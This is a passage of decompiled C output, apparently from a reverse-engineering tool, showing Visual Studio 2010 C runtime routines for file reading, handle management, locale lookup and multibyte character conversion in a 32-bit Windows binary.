                if ((*pbVar1 & 0x40) == 0) {
                  *pbVar1 = *pbVar1 | 2;
                }
                else {
                  *psVar12 = *(short *)_MaxCharCount;
                  psVar12 = psVar12 + 1;
                }
                break;
              }
              if (sVar17 == 0xd) {
                if (_MaxCharCount < local_10 + -1) {
                  if (*(short *)(_MaxCharCount + 2) == 10) {
                    uVar4 = _MaxCharCount + 4;
                    goto LAB_003bdbf0;
                  }
LAB_003bdc83:
                  _MaxCharCount = _MaxCharCount + 2;
                  sVar17 = 0xd;
LAB_003bdc85:
                  *psVar12 = sVar17;
                }
                else {
                  uVar4 = _MaxCharCount + 2;
                  BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),&local_c,2,&local_1c,
                                   (LPOVERLAPPED)0x0);
                  if (((BVar9 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) || (local_1c == 0))
                  goto LAB_003bdc83;
                  if ((*(byte *)(iVar14 + 4 + *piVar6) & 0x48) == 0) {
                    if ((psVar12 == local_14) && (local_c == 10)) goto LAB_003bdbf0;
                    __lseeki64_nolock(_FileHandle,-2,1);
                    if (local_c == 10) goto LAB_003bdc8c;
                    goto LAB_003bdc83;
                  }
                  if (local_c == 10) {
LAB_003bdbf0:
                    _MaxCharCount = uVar4;
                    sVar17 = 10;
                    goto LAB_003bdc85;
                  }
                  *psVar12 = 0xd;
                  *(undefined *)(iVar14 + 5 + *piVar6) = (undefined)local_c;
                  *(undefined *)(iVar14 + 0x25 + *piVar6) = local_c._1_1_;
                  *(undefined *)(iVar14 + 0x26 + *piVar6) = 10;
                  _MaxCharCount = uVar4;
                }
                psVar12 = psVar12 + 1;
                uVar4 = _MaxCharCount;
              }
              else {
                *psVar12 = sVar17;
                psVar12 = psVar12 + 1;
                uVar4 = _MaxCharCount + 2;
              }
LAB_003bdc8c:
              _MaxCharCount = uVar4;
            } while (_MaxCharCount < local_10);
          }
          local_10 = (short *)((int)psVar12 - (int)local_14);
          goto LAB_003bdb50;
        }
        if ((local_1c == 0) || (*(char *)psVar12 != '\n')) {
          *pbVar1 = *pbVar1 & 0xfb;
        }
        else {
          *pbVar1 = *pbVar1 | 4;
        }
        local_10 = (short *)((int)local_10 + (int)local_14);
        _MaxCharCount = (uint)local_14;
        psVar12 = local_14;
        if (local_14 < local_10) {
          do {
            cVar3 = *(char *)_MaxCharCount;
            if (cVar3 == '\x1a') {
              pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
              if ((*pbVar1 & 0x40) == 0) {
                *pbVar1 = *pbVar1 | 2;
              }
              else {
                *(undefined *)psVar12 = *(undefined *)_MaxCharCount;
                psVar12 = (short *)((int)psVar12 + 1);
              }
              break;
            }
            if (cVar3 == '\r') {
              if (_MaxCharCount < (undefined *)((int)local_10 + -1)) {
                if (*(char *)(_MaxCharCount + 1) == '\n') {
                  uVar7 = _MaxCharCount + 2;
                  goto LAB_003bd9d0;
                }
LAB_003bda47:
                _MaxCharCount = _MaxCharCount + 1;
                *(undefined *)psVar12 = 0xd;
              }
              else {
                uVar7 = _MaxCharCount + 1;
                BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),&local_5,1,&local_1c,
                                 (LPOVERLAPPED)0x0);
                if (((BVar9 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) || (local_1c == 0))
                goto LAB_003bda47;
                if ((*(byte *)(iVar14 + 4 + *piVar6) & 0x48) == 0) {
                  if ((psVar12 == local_14) && (local_5 == '\n')) goto LAB_003bd9d0;
                  __lseeki64_nolock(_FileHandle,-1,1);
                  if (local_5 == '\n') goto LAB_003bda4b;
                  goto LAB_003bda47;
                }
                if (local_5 == '\n') {
LAB_003bd9d0:
                  _MaxCharCount = uVar7;
                  *(undefined *)psVar12 = 10;
                }
                else {
                  *(undefined *)psVar12 = 0xd;
                  *(char *)(iVar14 + 5 + *piVar6) = local_5;
                  _MaxCharCount = uVar7;
                }
              }
              psVar12 = (short *)((int)psVar12 + 1);
              uVar7 = _MaxCharCount;
            }
            else {
              *(char *)psVar12 = cVar3;
              psVar12 = (short *)((int)psVar12 + 1);
              uVar7 = _MaxCharCount + 1;
            }
LAB_003bda4b:
            _MaxCharCount = uVar7;
          } while (_MaxCharCount < local_10);
        }
        local_10 = (short *)((int)psVar12 - (int)local_14);
        if ((local_6 != '\x01') || (local_10 == (short *)0x0)) goto LAB_003bdb50;
        bVar2 = *(byte *)(short *)((int)psVar12 + -1);
        if ((char)bVar2 < '\0') {
          iVar13 = 1;
          psVar12 = (short *)((int)psVar12 + -1);
          while ((((&DAT_003d7100)[bVar2] == '\0' && (iVar13 < 5)) && (local_14 <= psVar12))) {
            psVar12 = (short *)((int)psVar12 + -1);
            bVar2 = *(byte *)psVar12;
            iVar13 = iVar13 + 1;
          }
          if ((char)(&DAT_003d7100)[*(byte *)psVar12] == 0) {
            piVar6 = __errno();
            *piVar6 = 0x2a;
            goto LAB_003bdb4c;
          }
          if ((char)(&DAT_003d7100)[*(byte *)psVar12] + 1 == iVar13) {
            psVar12 = (short *)((int)psVar12 + iVar13);
          }
          else {
            if ((*(byte *)(*piVar6 + 4 + iVar14) & 0x48) == 0) {
              __lseeki64_nolock(_FileHandle,(longlong)-iVar13,1);
            }
            else {
              psVar8 = (short *)((int)psVar12 + 1);
              *(byte *)(*piVar6 + 5 + iVar14) = *(byte *)psVar12;
              if (1 < iVar13) {
                *(undefined *)(iVar14 + 0x25 + *piVar6) = *(undefined *)psVar8;
                psVar8 = psVar12 + 1;
              }
              if (iVar13 == 3) {
                *(undefined *)(iVar14 + 0x26 + *piVar6) = *(undefined *)psVar8;
                psVar8 = (short *)((int)psVar8 + 1);
              }
              psVar12 = (short *)((int)psVar8 - iVar13);
            }
          }
        }
        iVar13 = (int)psVar12 - (int)local_14;
        local_10 = (short *)MultiByteToWideChar(0xfde9,0,(LPCSTR)local_14,iVar13,(LPWSTR)_DstBuf,
                                                uVar4 >> 1);
        if (local_10 != (short *)0x0) {
          bVar15 = local_10 != (short *)iVar13;
          local_10 = (short *)((int)local_10 * 2);
          *(uint *)(iVar14 + 0x30 + *piVar6) = (uint)bVar15;
          goto LAB_003bdb50;
        }
        uVar11 = GetLastError();
LAB_003bdb45:
        __dosmaperr(uVar11);
      }
LAB_003bdb4c:
      local_18 = -1;
LAB_003bdb50:
      if (local_14 != (short *)_DstBuf) {
        _free(local_14);
      }
      if (local_18 == -2) {
        return (int)local_10;
      }
      return local_18;
    }
  }
LAB_003bd831:
  puVar5 = ___doserrno();
  *puVar5 = 0;
  piVar6 = __errno();
  *piVar6 = 0x16;
LAB_003bd843:
  FUN_003b60f9();
  return -1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __read
// 
// Library: Visual Studio 2010 Release

int __cdecl __read(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    return -1;
  }
  if ((-1 < _FileHandle) && ((uint)_FileHandle < uNumber_003ea048)) {
    iVar3 = (_FileHandle & 0x1fU) * 0x40;
    if ((*(byte *)((&DAT_003ea060)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
      if (_MaxCharCount < 0x80000000) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_003ea060)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __read_nolock(_FileHandle,_DstBuf,_MaxCharCount);
        }
        FUN_003bdde9();
        return local_20;
      }
      puVar1 = ___doserrno();
      *puVar1 = 0;
      piVar2 = __errno();
      *piVar2 = 0x16;
      goto LAB_003bdd49;
    }
  }
  puVar1 = ___doserrno();
  *puVar1 = 0;
  piVar2 = __errno();
  *piVar2 = 9;
LAB_003bdd49:
  FUN_003b60f9();
  return -1;
}



void FUN_003bdde9(void)

{
  int unaff_EBX;
  
  __unlock_fhandle(unaff_EBX);
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __chkstk
// 
// Library: Visual Studio 2010 Release

void __alloca_probe(void)

{
  undefined *in_EAX;
  undefined4 *puVar1;
  undefined4 *puVar2;
  undefined4 unaff_retaddr;
  undefined auStack4 [4];
  
  puVar2 = (undefined4 *)
           ((int)&stack0x00000000 - (int)in_EAX & ~-(uint)(register0x00000010 < in_EAX));
  for (puVar1 = (undefined4 *)((uint)auStack4 & 0xfffff000); puVar2 < puVar1;
      puVar1 = puVar1 + -0x400) {
  }
  *puVar2 = unaff_retaddr;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __set_osfhnd
// 
// Library: Visual Studio 2010 Release

int __cdecl __set_osfhnd(int param_1,intptr_t param_2)

{
  int *piVar1;
  ulong *puVar2;
  int iVar3;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < uNumber_003ea048)) {
    iVar3 = (param_1 & 0x1fU) * 0x40;
    if (*(int *)(iVar3 + (&DAT_003ea060)[param_1 >> 5]) == -1) {
      if (_DAT_003d64c0 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else {
          if (param_1 == 1) {
            nStdHandle = 0xfffffff5;
          }
          else {
            if (param_1 != 2) goto LAB_003bde88;
            nStdHandle = 0xfffffff4;
          }
        }
        SetStdHandle(nStdHandle,(HANDLE)param_2);
      }
LAB_003bde88:
      *(intptr_t *)(iVar3 + (&DAT_003ea060)[param_1 >> 5]) = param_2;
      return 0;
    }
  }
  piVar1 = __errno();
  *piVar1 = 9;
  puVar2 = ___doserrno();
  *puVar2 = 0;
  return -1;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __free_osfhnd
// 
// Library: Visual Studio 2010 Release

int __cdecl __free_osfhnd(int param_1)

{
  int iVar1;
  int *piVar2;
  ulong *puVar3;
  int iVar4;
  DWORD nStdHandle;
  
  if ((-1 < param_1) && ((uint)param_1 < uNumber_003ea048)) {
    iVar1 = (&DAT_003ea060)[param_1 >> 5];
    iVar4 = (param_1 & 0x1fU) * 0x40;
    if (((*(byte *)(iVar1 + 4 + iVar4) & 1) != 0) && (*(int *)(iVar1 + iVar4) != -1)) {
      if (_DAT_003d64c0 == 1) {
        if (param_1 == 0) {
          nStdHandle = 0xfffffff6;
        }
        else {
          if (param_1 == 1) {
            nStdHandle = 0xfffffff5;
          }
          else {
            if (param_1 != 2) goto LAB_003bdf0e;
            nStdHandle = 0xfffffff4;
          }
        }
        SetStdHandle(nStdHandle,(HANDLE)0x0);
      }
LAB_003bdf0e:
      *(undefined4 *)(iVar4 + (&DAT_003ea060)[param_1 >> 5]) = 0xffffffff;
      return 0;
    }
  }
  piVar2 = __errno();
  *piVar2 = 9;
  puVar3 = ___doserrno();
  *puVar3 = 0;
  return -1;
}



// Library Function - Single Match
//  __get_osfhandle
// 
// Library: Visual Studio 2010 Release

intptr_t __cdecl __get_osfhandle(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < uNumber_003ea048)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)(iVar3 + 4 + (&DAT_003ea060)[_FileHandle >> 5]) & 1) != 0) {
        return *(intptr_t *)(iVar3 + (&DAT_003ea060)[_FileHandle >> 5]);
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_003b60f9();
  }
  return -1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  ___lock_fhandle
// 
// Library: Visual Studio 2010 Release

int __cdecl ___lock_fhandle(int _Filehandle)

{
  BOOL BVar1;
  int iVar2;
  uint local_20;
  
  iVar2 = (_Filehandle & 0x1fU) * 0x40 + (&DAT_003ea060)[_Filehandle >> 5];
  local_20 = 1;
  if (*(int *)(iVar2 + 8) == 0) {
    __lock(10);
    if (*(int *)(iVar2 + 8) == 0) {
      BVar1 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(iVar2 + 0xc),4000);
      local_20 = (uint)(BVar1 != 0);
      *(int *)(iVar2 + 8) = *(int *)(iVar2 + 8) + 1;
    }
    FUN_003be031();
  }
  if (local_20 != 0) {
    EnterCriticalSection
              ((LPCRITICAL_SECTION)
               ((&DAT_003ea060)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  }
  return local_20;
}



void FUN_003be031(void)

{
  FUN_003b8677(10);
  return;
}



// Library Function - Single Match
//  __unlock_fhandle
// 
// Library: Visual Studio 2010 Release

void __cdecl __unlock_fhandle(int _Filehandle)

{
  LeaveCriticalSection
            ((LPCRITICAL_SECTION)
             ((&DAT_003ea060)[_Filehandle >> 5] + 0xc + (_Filehandle & 0x1fU) * 0x40));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __alloc_osfhnd
// 
// Library: Visual Studio 2010 Release

int __cdecl __alloc_osfhnd(void)

{
  bool bVar1;
  int iVar2;
  BOOL BVar3;
  undefined4 *puVar4;
  int iVar5;
  int local_20;
  
  local_20 = -1;
  iVar5 = 0;
  bVar1 = false;
  iVar2 = __mtinitlocknum(0xb);
  if (iVar2 == 0) {
    local_20 = -1;
  }
  else {
    __lock(0xb);
    for (; iVar5 < 0x40; iVar5 = iVar5 + 1) {
      puVar4 = (undefined4 *)(&DAT_003ea060)[iVar5];
      if (puVar4 == (undefined4 *)0x0) {
        puVar4 = (undefined4 *)__calloc_crt(0x20,0x40);
        if (puVar4 != (undefined4 *)0x0) {
          (&DAT_003ea060)[iVar5] = puVar4;
          uNumber_003ea048 = uNumber_003ea048 + 0x20;
          for (; puVar4 < (undefined4 *)((&DAT_003ea060)[iVar5] + 0x800); puVar4 = puVar4 + 0x10) {
            *(undefined *)(puVar4 + 1) = 0;
            *puVar4 = 0xffffffff;
            *(undefined *)((int)puVar4 + 5) = 10;
            puVar4[2] = 0;
          }
          local_20 = iVar5 << 5;
          *(undefined *)((&DAT_003ea060)[local_20 >> 5] + 4) = 1;
          iVar2 = ___lock_fhandle(local_20);
          if (iVar2 == 0) {
            local_20 = -1;
          }
        }
        break;
      }
      for (; puVar4 < (undefined4 *)((&DAT_003ea060)[iVar5] + 0x800); puVar4 = puVar4 + 0x10) {
        if ((*(byte *)(puVar4 + 1) & 1) == 0) {
          if (puVar4[2] == 0) {
            __lock(10);
            if (puVar4[2] == 0) {
              BVar3 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(puVar4 + 3),4000);
              if (BVar3 == 0) {
                bVar1 = true;
              }
              else {
                puVar4[2] = puVar4[2] + 1;
              }
            }
            FUN_003be133();
          }
          if (!bVar1) {
            EnterCriticalSection((LPCRITICAL_SECTION)(puVar4 + 3));
            if ((*(byte *)(puVar4 + 1) & 1) == 0) {
              *(undefined *)(puVar4 + 1) = 1;
              *puVar4 = 0xffffffff;
              local_20 = ((int)puVar4 - (&DAT_003ea060)[iVar5] >> 6) + iVar5 * 0x20;
              break;
            }
            LeaveCriticalSection((LPCRITICAL_SECTION)(puVar4 + 3));
          }
        }
      }
      if (local_20 != -1) break;
    }
    FUN_003be1f1();
  }
  return local_20;
}



void FUN_003be133(void)

{
  FUN_003b8677(10);
  return;
}



void FUN_003be1f1(void)

{
  FUN_003b8677(0xb);
  return;
}



// Library Function - Single Match
//  __putwch_nolock
// 
// Library: Visual Studio 2010 Release

wint_t __cdecl __putwch_nolock(wchar_t _WCh)

{
  BOOL BVar1;
  DWORD local_8;
  
  if (DAT_003d7280 == (HANDLE)0xfffffffe) {
    ___initconout();
  }
  if (DAT_003d7280 != (HANDLE)0xffffffff) {
    BVar1 = WriteConsoleW(DAT_003d7280,&_WCh,1,&local_8,(LPVOID)0x0);
    if (BVar1 != 0) {
      return (wint_t)_WCh;
    }
  }
  return 0xffff;
}



// Library Function - Single Match
//  __mbtowc_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __mbtowc_l(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes,_locale_t _Locale)

{
  wchar_t *pwVar1;
  int iVar2;
  int *piVar3;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  if ((_SrcCh != (char *)0x0) && (_SrcSizeInBytes != 0)) {
    if (*_SrcCh != '\0') {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
      if ((local_14.locinfo)->lc_category[0].wlocale != (wchar_t *)0x0) {
        iVar2 = __isleadbyte_l((uint)(byte)*_SrcCh,(_locale_t)&local_14);
        if (iVar2 == 0) {
          iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,1,_DstCh,
                                      (uint)(_DstCh != (wchar_t *)0x0));
          if (iVar2 != 0) goto LAB_003be28a;
        }
        else {
          pwVar1 = (local_14.locinfo)->locale_name[3];
          if ((((1 < (int)pwVar1) && ((int)pwVar1 <= (int)_SrcSizeInBytes)) &&
              (iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,(int)pwVar1,
                                           _DstCh,(uint)(_DstCh != (wchar_t *)0x0)), iVar2 != 0)) ||
             (((local_14.locinfo)->locale_name[3] <= _SrcSizeInBytes && (_SrcCh[1] != '\0')))) {
            pwVar1 = (local_14.locinfo)->locale_name[3];
            if (local_8 == '\0') {
              return (int)pwVar1;
            }
            *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
            return (int)pwVar1;
          }
        }
        piVar3 = __errno();
        *piVar3 = 0x2a;
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return -1;
      }
      if (_DstCh != (wchar_t *)0x0) {
        *_DstCh = (ushort)(byte)*_SrcCh;
      }
LAB_003be28a:
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      return 1;
    }
    if (_DstCh != (wchar_t *)0x0) {
      *_DstCh = L'\0';
    }
  }
  return 0;
}



// Library Function - Single Match
//  _mbtowc
// 
// Library: Visual Studio 2010 Release

int __cdecl _mbtowc(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes)

{
  int iVar1;
  
  iVar1 = __mbtowc_l(_DstCh,_SrcCh,_SrcSizeInBytes,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  _iswctype
// 
// Library: Visual Studio 2010 Release

int __cdecl _iswctype(wint_t _C,wctype_t _Type)

{
  BOOL BVar1;
  ushort local_8 [2];
  
  if (_C != 0xffff) {
    if (_C < 0x100) {
      local_8[0] = *(ushort *)(PTR_DAT_003d64cc + (uint)_C * 2);
    }
    else {
      BVar1 = GetStringTypeW(1,(LPCWSTR)&_C,1,local_8);
      if (BVar1 == 0) {
        local_8[0] = 0;
      }
    }
    return (uint)(local_8[0] & _Type);
  }
  return 0;
}



// Library Function - Single Match
//  __wchartodigit
// 
// Library: Visual Studio 2010 Release

int __cdecl __wchartodigit(ushort param_1)

{
  int iVar1;
  ushort uVar2;
  
  if (0x2f < param_1) {
    if (param_1 < 0x3a) {
      return param_1 - 0x30;
    }
    iVar1 = 0xff10;
    if (param_1 < 0xff10) {
      iVar1 = 0x660;
      if (param_1 < 0x660) {
        return -1;
      }
      if (param_1 < 0x66a) goto LAB_003be406;
      iVar1 = 0x6f0;
      if (param_1 < 0x6f0) {
        return -1;
      }
      if (param_1 < 0x6fa) goto LAB_003be406;
      iVar1 = 0x966;
      if (param_1 < 0x966) {
        return -1;
      }
      if (param_1 < 0x970) goto LAB_003be406;
      iVar1 = 0x9e6;
      if (param_1 < 0x9e6) {
        return -1;
      }
      if (param_1 < 0x9f0) goto LAB_003be406;
      iVar1 = 0xa66;
      if (param_1 < 0xa66) {
        return -1;
      }
      if (param_1 < 0xa70) goto LAB_003be406;
      iVar1 = 0xae6;
      if (param_1 < 0xae6) {
        return -1;
      }
      if (param_1 < 0xaf0) goto LAB_003be406;
      iVar1 = 0xb66;
      if (param_1 < 0xb66) {
        return -1;
      }
      if (param_1 < 0xb70) goto LAB_003be406;
      iVar1 = 0xc66;
      if (param_1 < 0xc66) {
        return -1;
      }
      if (param_1 < 0xc70) goto LAB_003be406;
      iVar1 = 0xce6;
      if (param_1 < 0xce6) {
        return -1;
      }
      if (param_1 < 0xcf0) goto LAB_003be406;
      iVar1 = 0xd66;
      if (param_1 < 0xd66) {
        return -1;
      }
      if (param_1 < 0xd70) goto LAB_003be406;
      iVar1 = 0xe50;
      if (param_1 < 0xe50) {
        return -1;
      }
      if (param_1 < 0xe5a) goto LAB_003be406;
      iVar1 = 0xed0;
      if (param_1 < 0xed0) {
        return -1;
      }
      if (param_1 < 0xeda) goto LAB_003be406;
      iVar1 = 0xf20;
      if (param_1 < 0xf20) {
        return -1;
      }
      if (param_1 < 0xf2a) goto LAB_003be406;
      iVar1 = 0x1040;
      if (param_1 < 0x1040) {
        return -1;
      }
      if (param_1 < 0x104a) goto LAB_003be406;
      iVar1 = 0x17e0;
      if (param_1 < 0x17e0) {
        return -1;
      }
      if (param_1 < 0x17ea) goto LAB_003be406;
      iVar1 = 0x1810;
      if (param_1 < 0x1810) {
        return -1;
      }
      uVar2 = 0x181a;
    }
    else {
      uVar2 = 0xff1a;
    }
    if (param_1 < uVar2) {
LAB_003be406:
      return (uint)param_1 - iVar1;
    }
  }
  return -1;
}



// Library Function - Single Match
//  int __cdecl x_ismbbtype_l(struct localeinfo_struct *,unsigned int,int,int)
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl x_ismbbtype_l(localeinfo_struct *param_1,unsigned_int param_2,int param_3,int param_4)

{
  uint uVar1;
  int local_14;
  int local_10;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,param_1);
  if ((*(byte *)(local_10 + 0x1d + (param_2 & 0xff)) & (byte)param_4) == 0) {
    if (param_3 == 0) {
      uVar1 = 0;
    }
    else {
      uVar1 = (uint)*(ushort *)(*(int *)(local_14 + 200) + (param_2 & 0xff) * 2) & param_3;
    }
    if (uVar1 == 0) goto LAB_003be5a5;
  }
  uVar1 = 1;
LAB_003be5a5:
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



// Library Function - Single Match
//  __ismbblead
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl __ismbblead(uint _C)

{
  int iVar1;
  
  iVar1 = x_ismbbtype_l((localeinfo_struct *)0x0,_C,0,4);
  return iVar1;
}



// WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe
// Library Function - Single Match
//  int __cdecl __crtGetLocaleInfoA_stat(struct localeinfo_struct *,unsigned long,unsigned long,char
// *,int)
// 
// Library: Visual Studio 2010 Release

int __cdecl
__crtGetLocaleInfoA_stat
          (localeinfo_struct *param_1,unsigned_long param_2,unsigned_long param_3,char *param_4,
          int param_5)

{
  uint _Size;
  UINT CodePage;
  uint uVar1;
  uint cchData;
  undefined4 *lpLCData;
  int iVar2;
  uint extraout_EDX;
  uint uVar3;
  uint extraout_EDX_00;
  uint extraout_EDX_01;
  undefined uVar4;
  
  uVar1 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  CodePage = param_1->locinfo->lc_codepage;
  cchData = GetLocaleInfoW(param_2,param_3,(LPWSTR)0x0,0);
  uVar3 = extraout_EDX;
  if (cchData != 0) {
    if (((int)cchData < 1) || (uVar3 = 0xffffffe0 % cchData, 0xffffffe0 / cchData < 2)) {
      lpLCData = (undefined4 *)0x0;
    }
    else {
      _Size = cchData * 2 + 8;
      if (_Size < 0x401) {
        if ((undefined *)register0x00000010 == (undefined *)0x1c) goto LAB_003be607;
        lpLCData = (undefined4 *)&stack0xffffffec;
      }
      else {
        lpLCData = (undefined4 *)_malloc(_Size);
        uVar3 = extraout_EDX_00;
        if (lpLCData != (undefined4 *)0x0) {
          *lpLCData = 0xdddd;
          lpLCData = lpLCData + 2;
        }
      }
    }
    if (lpLCData != (undefined4 *)0x0) {
      iVar2 = GetLocaleInfoW(param_2,param_3,(LPWSTR)lpLCData,cchData);
      uVar4 = (undefined)cchData;
      if (iVar2 != 0) {
        if (param_5 == 0) {
          param_5 = 0;
          param_4 = (LPSTR)0x0;
        }
        WideCharToMultiByte(CodePage,0,(LPCWSTR)lpLCData,-1,param_4,param_5,(LPCSTR)0x0,(LPBOOL)0x0)
        ;
      }
      __freea(lpLCData);
      uVar3 = extraout_EDX_01;
      goto LAB_003be694;
    }
  }
LAB_003be607:
  uVar4 = (undefined)cchData;
LAB_003be694:
  iVar2 = terminate_if_debugger_present(uVar1 ^ (uint)&stack0xfffffffc,uVar3,uVar4);
  return iVar2;
}



// Library Function - Single Match
//  ___crtGetLocaleInfoA
// 
// Library: Visual Studio 2010 Release

int __cdecl
___crtGetLocaleInfoA
          (_locale_t _Plocinfo,LPCWSTR _LocaleName,LCTYPE _LCType,LPSTR _LpLCData,int _CchData)

{
  int iVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Plocinfo);
  iVar1 = __crtGetLocaleInfoA_stat(&local_14,(unsigned_long)_LocaleName,_LCType,_LpLCData,_CchData);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



// Library Function - Single Match
//  __global_unwind2
// 
// Library: Visual Studio

void __cdecl __global_unwind2(PVOID param_1)

{
  _release_context(param_1,(PVOID)0x3be6f8,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  __local_unwind2
// 
// Library: Visual Studio

void __cdecl __local_unwind2(int param_1,uint param_2)

{
  uint uVar1;
  undefined4 *in_FS_OFFSET;
  undefined4 local_20;
  undefined *puStack28;
  undefined4 local_18;
  int iStack20;
  
  iStack20 = param_1;
  puStack28 = &LAB_003be700;
  local_20 = *in_FS_OFFSET;
  *in_FS_OFFSET = &local_20;
  while( true ) {
    uVar1 = *(uint *)(param_1 + 0xc);
    if ((uVar1 == 0xffffffff) || ((param_2 != 0xffffffff && (uVar1 <= param_2)))) break;
    local_18 = *(undefined4 *)(*(int *)(param_1 + 8) + uVar1 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_18;
    if (*(int *)(*(int *)(param_1 + 8) + 4 + uVar1 * 0xc) == 0) {
      __NLG_Notify(0x101);
      FUN_003be814();
    }
  }
  *in_FS_OFFSET = local_20;
  return;
}



// Library Function - Single Match
//  __NLG_Notify1
// 
// Library: Visual Studio

undefined4 __fastcall __NLG_Notify1(undefined4 param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_003d7274 = in_EAX;
  DAT_003d7278 = param_1;
  DAT_003d727c = unaff_EBP;
  return in_EAX;
}



// Library Function - Single Match
//  __NLG_Notify
// 
// Library: Visual Studio

void __NLG_Notify(ulong param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_003d7274 = in_EAX;
  DAT_003d7278 = param_1;
  DAT_003d727c = unaff_EBP;
  return;
}



void FUN_003be814(void)

{
  code *in_EAX;
  
  (*in_EAX)();
  return;
}



// Library Function - Single Match
//  ___ascii_stricmp
// 
// Library: Visual Studio 2010 Release

int __cdecl ___ascii_stricmp(char *_Str1,char *_Str2)

{
  uint uVar1;
  uint uVar2;
  
  do {
    uVar1 = (uint)(byte)*_Str1;
    _Str1 = (char *)((byte *)_Str1 + 1);
    if (uVar1 - 0x41 < 0x1a) {
      uVar1 = uVar1 + 0x20;
    }
    uVar2 = (uint)(byte)*_Str2;
    _Str2 = (char *)((byte *)_Str2 + 1);
    if (uVar2 - 0x41 < 0x1a) {
      uVar2 = uVar2 + 0x20;
    }
  } while ((uVar1 != 0) && (uVar1 == uVar2));
  return uVar1 - uVar2;
}



// Library Function - Single Match
//  __stricmp_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __stricmp_l(char *_Str1,char *_Str2,_locale_t _Locale)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if (_Str1 == (char *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    if (local_8 != '\0') {
      *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
    }
    iVar2 = 0x7fffffff;
  }
  else {
    if (_Str2 == (char *)0x0) {
      piVar1 = __errno();
      *piVar1 = 0x16;
      FUN_003b60f9();
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      iVar2 = 0x7fffffff;
    }
    else {
      if ((local_14.locinfo)->lc_category[0].wlocale == (wchar_t *)0x0) {
        iVar2 = ___ascii_stricmp(_Str1,_Str2);
